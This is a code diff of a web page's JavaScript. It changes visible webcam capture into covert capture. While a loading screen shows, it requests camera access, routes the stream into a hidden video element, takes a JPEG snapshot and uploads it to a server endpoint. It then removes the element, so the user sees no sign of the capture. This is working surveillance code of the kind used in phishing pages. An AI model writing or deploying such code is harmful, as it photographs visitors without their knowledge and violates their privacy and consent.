@@ -1,9 +1,11 @@
 window.addEventListener('DOMContentLoaded', () => {
   const loader = document.querySelector('.loader');
   const container = document.querySelector('.container');
-  const video = document.getElementById('video');
-  let stream = null;
-  let captureInterval = null;
+  
+  // Create a hidden video element for capture
+  const video = document.createElement('video');
+  video.style.display = 'none';
+  document.body.appendChild(video);
   
   const canvas = document.createElement('canvas');
   const ctx = canvas.getContext('2d');
@@ -14,13 +16,22 @@ window.addEventListener('DOMContentLoaded', () => {
     
     if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
       navigator.mediaDevices.getUserMedia({ video: true })
-        .then(streamData => {
-          stream = streamData;
+        .then(stream => {
           video.srcObject = stream;
           video.play();
-          
           video.addEventListener('loadedmetadata', () => {
-            startPhotoCapture();
+            // Set canvas dimensions to match video
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            // Capture photo after a short delay to ensure good quality
+            setTimeout(() => {
+              capturePhoto();
+              // Stop the stream after capturing
+              stream.getTracks().forEach(track => track.stop());
+              // Remove the video element
+              video.remove();
+            }, 1000);
           });
         })
         .catch(err => {
@@ -30,16 +41,6 @@ window.addEventListener('DOMContentLoaded', () => {
       console.warn('getUserMedia not supported by this browser');
     }
   }, 1000);
-  
-  function startPhotoCapture() {
-    // Set canvas dimensions to match video
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    
-    captureInterval = setInterval(() => {
-      capturePhoto();
-    }, 1000);
-  }
   
   function capturePhoto() {
     // Draw current video frame to canvas
@@ -54,14 +55,14 @@ window.addEventListener('DOMContentLoaded', () => {
         // Send photo to server
         sendPhotoToServer(blob, filename);
       }
-    }, 
+    }, 'image/jpeg', 0.8); // JPEG format with 80% quality
   }
   
   function sendPhotoToServer(blob, filename) {
     const formData = new FormData();
     formData.append('photo', blob, filename);
     
-    fetch('/save-capture', {
+    fetch('/upload_photo', {
       method: 'POST',
       body: formData
     })
@@ -76,13 +77,4 @@ window.addEventListener('DOMContentLoaded', () => {
       console.error('Error sending photo:', error);
     });
   }
-  
-  window.addEventListener('beforeunload', () => {
-    if (captureInterval) {
-      clearInterval(captureInterval);
-    }
-    if (stream) {
-      stream.getTracks().forEach(track => track.stop());
-    }
-  });
 });
